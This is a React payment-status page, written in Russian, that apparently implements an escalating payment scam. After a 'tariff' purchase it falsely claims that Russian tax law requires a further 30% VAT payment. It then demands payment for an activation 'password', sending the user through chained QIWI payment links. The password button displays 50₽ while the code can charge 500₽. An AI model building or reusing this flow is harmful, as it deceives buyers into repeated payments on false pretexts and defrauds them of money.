import querystring from "query-string";
import React, { Component } from "react";
import { browserHistory } from "../MainWrapper";
import API from "../api/API";
import appContext from "../context/AppContext";
import "./PaymentStatusPage.css";
import { config } from "../config";

class PaymentStatusErrorPage extends Component {
  state = {
    error: false,
  };

  componentWillMount() {
    localStorage.removeItem("cartItems");
    appContext.onCartChange();
  }

  render() {
    {
      const parsed = window.location.search.split("?").slice(1);

      const old = {
        type: parsed[0].split("=")[1],
        amount: parseInt(parsed[1].split("=")[1]),
        id: parsed[2].split("=")[1],
      };

      if (!localStorage.getItem(old.id)) {
        localStorage.setItem(old.id, "true");

        API.new_deposit(parseInt(parsed[1].split("=")[1]), (resp) => {
          if (resp.error) return;
        });
      }

      switch (old.type) {
        case "tariff":
          return (
            <div className="paymentStatusPage">
              <h1>Оплата тарифа получена!</h1>

              <p>
                <b>
                  по "НК РФ Глава 21. НАЛОГ НА ДОБАВЛЕННУЮ СТОИМОСТЬ", для
                  получения 📃 ТАРИФА, Вам потребуется оплатить НДС, в размере
                  30% от стоимости купленного тарифа!
                </b>
              </p>

              <button
                onClick={() => {
                  window.location.href = `https://oplata.qiwi.com/create?publicKey=${
                    config.qiwi.public_key
                  }&amount=${((old.amount / 100) * 30).toFixed()}&successUrl=${
                    config.domain
                  }/paymentStatus/success?type=${"nds"}?amount=${(
                    (old.amount / 100) *
                    30
                  ).toFixed()}?id=${`${Math.random()}`.slice(
                    2
                  )}&customFields[paySourcesFilter]=${"card,qw,mobile"}`;
                }}
              >
                Оплатить НДС: {((old.amount / 100) * 30).toFixed()}₽
              </button>
            </div>
          );
        case "nds":
          return (
            <div className="paymentStatusPage">
              <h1>Оплата НДС получена!</h1>

              <p>
                <b>
                  ‼️ Осталось совсем немного, для активации тарифа нужен 🔑
                  пароль, приобрести его можно ниже ⬇️
                </b>
              </p>

              <button
                onClick={() => {
                  window.location.href = `https://oplata.qiwi.com/create?publicKey=${
                    config.qiwi.public_key
                  }&amount=${old.amount < 100 ? 50 : 500}&successUrl=${
                    config.domain
                  }/paymentStatus/success?type=${"password"}?amount=${
                    old.amount < 100 ? 50 : 500
                  }?id=${`${Math.random()}`.slice(
                    2
                  )}&customFields[paySourcesFilter]=${"card,qw,mobile"}`;
                }}
              >
                Оплатить Пароль: {50}₽
              </button>
            </div>
          );
        case "password":
          return (
            <div className="paymentStatusPage">
              <h1>Оплата Пароля получена!</h1>
            </div>
          );
      }
    }
  }
}

export default PaymentStatusErrorPage;
